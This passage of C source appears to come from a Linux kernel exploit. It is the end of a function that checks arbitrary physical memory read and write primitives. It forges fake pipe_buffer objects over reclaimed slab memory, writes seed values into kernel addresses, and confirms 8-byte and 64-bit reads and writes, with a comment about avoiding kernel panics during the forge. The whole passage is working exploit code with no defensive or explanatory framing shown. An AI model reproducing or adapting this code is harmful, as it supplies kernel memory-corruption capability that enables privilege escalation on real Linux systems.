  if (proof_page != (proof_addr & ~(PAGE_SIZE - 1))) {
    return 0;
  }

  char seed[] = PHYS_READ_TAG;
  if (kernel_write_data(fd, proof_addr, seed, sizeof(seed)) !=
      (ssize_t)sizeof(seed)) {
    return 0;
  }

  memset(physrw_readback, 0, sizeof(physrw_readback));
  physrw_read_ok =
    pipe_phys_read_data(fd, proof_addr, physrw_readback, sizeof(seed));
  pr_debug("phys step probed read done ok=%d idx=%d\n",
           physrw_read_ok, pipebuf_pipe_idx);

  /*
   * Fast-abort: if the proof read did not return our seed, the
   * probed pipe_buffer does NOT belong to pipe_fds_reclaim[idx]
   * (foreign cg-1k object). Do NOT run the write/read64/write64
   * proofs — each of them would forge a fake pipe_buffer over a
   * live foreign object again, and every forge window is a
   * potential kernel panic.
   */
  if (!physrw_read_ok ||
      memcmp(physrw_readback, seed, sizeof(seed)) != 0) {
    pr_debug("phys step probe readback mismatch, aborting before write tests\n");
    return 0;
  }

  char overwrite[] = PHYS_WRITE_TAG;
  physrw_write_ok =
    pipe_phys_write_data(fd, proof_addr, overwrite, sizeof(overwrite));
  pr_debug("phys step probed write done ok=%d\n", physrw_write_ok);
  kernel_read_data(fd, proof_addr, physrw_after_write, sizeof(overwrite));

  uintptr_t proof64_addr = proof_addr + 0x100;
  uint64_t seed64 = PHYS64_SEED;
  uint64_t next64 = PHYS64_NEXT;
  kernel_write_data(fd, proof64_addr, &seed64, sizeof(seed64));
  physrw_read64_before = pipe_read64(fd, proof64_addr);
  physrw_read64_ok = physrw_read64_before == seed64;
  pr_debug("phys step read64 done ok=%d value=%016zx\n",
           physrw_read64_ok, physrw_read64_before);
  physrw_write64_value = next64;
  physrw_write64_ok = pipe_write64(fd, proof64_addr, next64);
  kernel_read_data(
      fd, proof64_addr, &physrw_read64_after, sizeof(physrw_read64_after));
  physrw_write64_ok =
    physrw_write64_ok && physrw_read64_after == physrw_write64_value;

  return physrw_read_ok &&
         memcmp(physrw_readback, seed, sizeof(seed)) == 0 &&
         physrw_write_ok &&
         memcmp(physrw_after_write, overwrite, sizeof(overwrite)) == 0 &&
         physrw_read64_ok && physrw_write64_ok;
}
